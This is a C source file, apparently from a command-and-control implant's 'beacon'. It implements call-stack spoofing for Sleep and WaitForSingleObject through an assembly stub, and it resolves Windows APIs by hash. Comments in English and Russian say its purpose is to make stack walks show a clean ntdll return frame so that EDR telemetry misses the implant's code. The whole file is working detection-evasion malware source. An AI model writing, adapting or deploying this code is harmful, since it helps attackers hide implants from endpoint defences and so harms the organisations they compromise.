// Call-stack spoofing helper.
//
// co2h_call_spoofed (assembly, see syscall_stubs.asm) executes a target
// function while the return address of its own frame points into ntdll
// (RtlUserThreadStart by default). Stack walks taken while the target
// runs unwind to a clean ntdll frame instead of beacon's .text.
//
// x86 build: спуфинг стека не реализован (WOW64 и EDR-телеметрия на x86
// значительно менее строгие). spoofed_sleep/spoofed_wait вызывают
// Sleep/WaitForSingleObject напрямую.

#include "../core/beacon.h"

#ifdef _WIN64
extern uint64_t co2h_call_spoofed(void* fn, void* fake_ret,
                                  uint64_t a1, uint64_t a2,
                                  uint64_t a3, uint64_t a4);

static void* g_fake_ret = NULL;

static void* resolve_fake_ret(void) {
    if (g_fake_ret) return g_fake_ret;
    void* p = api_resolve(api_hash_w(L"ntdll.dll"),
                          api_hash("RtlUserThreadStart"));
    if (!p) return NULL;
    g_fake_ret = (BYTE*)p + 0x21;
    return g_fake_ret;
}
#endif /* _WIN64 */

void spoofed_sleep(uint32_t ms) {
#ifdef _WIN64
    void* fr = resolve_fake_ret();
    void* fn = api_resolve(api_hash_w(L"kernel32.dll"), api_hash("Sleep"));
    if (fr && fn) { co2h_call_spoofed(fn, fr, (uint64_t)ms, 0, 0, 0); return; }
#endif
    Sleep(ms);
}

uint32_t spoofed_wait(HANDLE h, uint32_t ms) {
#ifdef _WIN64
    void* fr = resolve_fake_ret();
    void* fn = api_resolve(api_hash_w(L"kernel32.dll"),
                           api_hash("WaitForSingleObject"));
    if (fr && fn)
        return (uint32_t)co2h_call_spoofed(fn, fr, (uint64_t)h, (uint64_t)ms, 0, 0);
#endif
    return WaitForSingleObject(h, ms);
}
